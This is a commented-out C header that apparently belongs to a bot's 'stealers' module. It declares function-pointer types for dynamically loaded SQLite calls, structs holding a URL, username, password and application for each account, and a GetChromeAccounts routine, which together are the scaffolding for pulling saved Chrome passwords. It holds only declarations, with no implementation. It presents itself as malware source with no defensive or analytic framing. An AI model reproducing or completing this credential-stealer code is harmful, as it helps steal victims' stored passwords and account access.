// #pragma once
// #include "modules.h"
// 
// #ifdef MODULE_STEALERS
// #include "bot_structs.h"
// #include "sqlite3.h"
// #include "utils.h"
// #include "mem.h"
// 
// HMODULE hSqlite;
// typedef int(SQLITE_STDCALL * tsqlite3_open16)( const void *filename, sqlite3 **ppDb );
// typedef void*(SQLITE_STDCALL * tsqlite3_prepare_v2)( sqlite3 *db, const char *zSql, int nByte, sqlite3_stmt **ppStmt, const char **pzTail );
// typedef int(SQLITE_STDCALL * tsqlite3_step)(sqlite3_stmt*);
// typedef const void *(SQLITE_STDCALL * tsqlite3_column_blob)(sqlite3_stmt*, int iCol);
// typedef int(SQLITE_STDCALL * tsqlite3_column_bytes)(sqlite3_stmt*, int iCol);
// typedef const unsigned char *(SQLITE_STDCALL * tsqlite3_column_text)(sqlite3_stmt*, int iCol);
// 
// 
// typedef struct
// {
// 	LPSTR URL;
// 	LPSTR Username;
// 	LPSTR Password;
// 	LPSTR Application;
// }RecAccount;
// typedef struct
// {
// 	RecAccount** Accounts;
// 	int AccountsCount;
// }ChromeAccounts;
// 
// ChromeAccounts* GetChromeAccounts(void);
// #endif
// 
